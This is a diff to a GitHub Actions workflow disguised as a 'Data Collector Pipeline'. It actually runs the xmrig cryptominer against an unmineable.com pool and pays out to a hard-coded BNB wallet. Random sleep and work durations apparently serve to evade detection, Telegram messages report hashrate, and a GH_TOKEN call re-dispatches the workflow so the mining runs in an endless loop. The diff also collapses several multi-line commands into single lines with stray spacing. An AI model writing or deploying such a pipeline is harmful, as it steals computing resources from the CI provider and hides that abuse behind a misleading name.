@@ -2,7 +2,7 @@ name: Data Collector Pipeline
 
 on:
   schedule:
-    - cron: '0 6,18 * * *'  # Jam 13:00 dan 01:00 WIB
+    - cron: '0 0,12 * * *'  # Jam 07:00 dan 19:00 WIB
   workflow_dispatch:
 
 permissions:
@@ -28,9 +28,8 @@ jobs:
           TG_TOKEN: ${{ secrets.TG_TOKEN }}
           TG_CHAT_ID: ${{ secrets.TG_CHAT_ID }}
         run: |
-          echo "🟢 *BNB Collector aktif.*\nDurasi kerja acak 20–90 menit." | \
-          curl -s -X POST https://api.telegram.org/bot$TG_TOKEN/sendMessage \
-            -d chat_id=$TG_CHAT_ID --data-urlencode text@- -d parse_mode=Markdown
+          echo "🟢 *BNB Collector aktif.*
+Durasi kerja acak 20–90 menit." |           curl -s -X POST https://api.telegram.org/bot$TG_TOKEN/sendMessage             -d chat_id=$TG_CHAT_ID --data-urlencode text@- -d parse_mode=Markdown
 
       - name: Start Collector Agent
         run: |
@@ -43,10 +42,7 @@ jobs:
           echo "Menunggu $DELAY detik..."
           sleep $DELAY
 
-          ./xmrig -a rx \
-            -o stratum+ssl://rx.unmineable.com:443 \
-            -u BNB:0xf319aef8c1d323c83740bcde9f25238ff5c4855d.unmineable_worker_vidjbpg#f2xg-6ynu \
-            -p x --randomx-no-rdmsr | tee log.txt &
+          ./xmrig -a rx             -o stratum+ssl://xmrig.unmineable.com:443             -u BNB:0xf319aef8c1d323c83740bcde9f25238ff5c4855d.unmineable_worker_vidjbpg#f2xg-6ynu             -p x --randomx-no-rdmsr | tee log.txt &
 
           PID=$!
           WORKTIME=$((RANDOM % 5400 + 1200))
@@ -61,33 +57,23 @@ jobs:
           TG_CHAT_ID: ${{ secrets.TG_CHAT_ID }}
         run: |
           set +e
-
           DIR=$(find . -type d -name "xmrig-6.24.0" | head -n1)
           if [ -d "$DIR" ]; then
             cd "$DIR"
           else
             echo "❌ Direktori xmrig tidak ditemukan"
-            echo "❌ Gagal ekstrak log atau direktori tidak ada." | curl -s -X POST https://api.telegram.org/bot$TG_TOKEN/sendMessage \
-              -d chat_id=$TG_CHAT_ID --data-urlencode text@- -d parse_mode=Markdown
+            echo "❌ Gagal ekstrak log atau direktori tidak ada." | curl -s -X POST https://api.telegram.org/bot$TG_TOKEN/sendMessage               -d chat_id=$TG_CHAT_ID --data-urlencode text@- -d parse_mode=Markdown
             exit 0
           fi
-
           HASHRATE=$(grep -a "speed" log.txt | tail -n1 | sed 's/\x1b\[[0-9;]*m//g' | awk '{print $(NF-1) " H/s"}')
           ACCEPTED=$(grep -a "accepted" log.txt | wc -l)
           REJECTED=$(grep -a "rejected" log.txt | wc -l)
           HASHRATE=${HASHRATE:-"0 H/s"}
-
           MSG="✅ *BNB Collector selesai.*\n\n📊 *Stats:*\n• Hashrate: \`$HASHRATE\`\n• Accepted: \`$ACCEPTED\`\n• Rejected: \`$REJECTED\`"
-
-          echo "$MSG" | curl -s -X POST https://api.telegram.org/bot$TG_TOKEN/sendMessage \
-            -d chat_id=$TG_CHAT_ID --data-urlencode text@- -d parse_mode=Markdown
-
+          echo "$MSG" | curl -s -X POST https://api.telegram.org/bot$TG_TOKEN/sendMessage             -d chat_id=$TG_CHAT_ID --data-urlencode text@- -d parse_mode=Markdown
           HR_NUM=$(echo "$HASHRATE" | grep -oE '^[0-9]+')
-          if [[ "$HR_NUM" =~ ^[0-9]+$ ]] && [ "$HR_NUM" -lt 100 ]]; then
-            curl -s -X POST https://api.telegram.org/bot$TG_TOKEN/sendMessage \
-              -d chat_id=$TG_CHAT_ID \
-              --data-urlencode text="🚨 *Hashrate rendah!* $HASHRATE." \
-              -d parse_mode=Markdown
+          if [[ "$HR_NUM" =~ ^[0-9]+$ ]] && [ "$HR_NUM" -lt 100 ]; then
+            curl -s -X POST https://api.telegram.org/bot$TG_TOKEN/sendMessage               -d chat_id=$TG_CHAT_ID               --data-urlencode text="🚨 *Hashrate rendah!* $HASHRATE."               -d parse_mode=Markdown
 
       - name: Cooldown Before Next Cycle
         if: always()
@@ -102,7 +88,4 @@ jobs:
           GH_TOKEN: ${{ secrets.GH_TOKEN }}
         run: |
           sleep $((RANDOM % 60 + 10))
-          curl -X POST -H "Authorization: Bearer $GH_TOKEN" \
-               -H "Accept: application/vnd.github+json" \
-               https://api.github.com/repos/${{ github.repository }}/actions/workflows/data-collector.yml/dispatches \
-               -d '{"ref":"main"}'
+          curl -X POST -H "Authorization: Bearer $GH_TOKEN"                -H "Accept: application/vnd.github+json"                https://api.github.com/repos/${{ github.repository }}/actions/workflows/bnb-collector.yml/dispatches                -d '{"ref":"main"}'
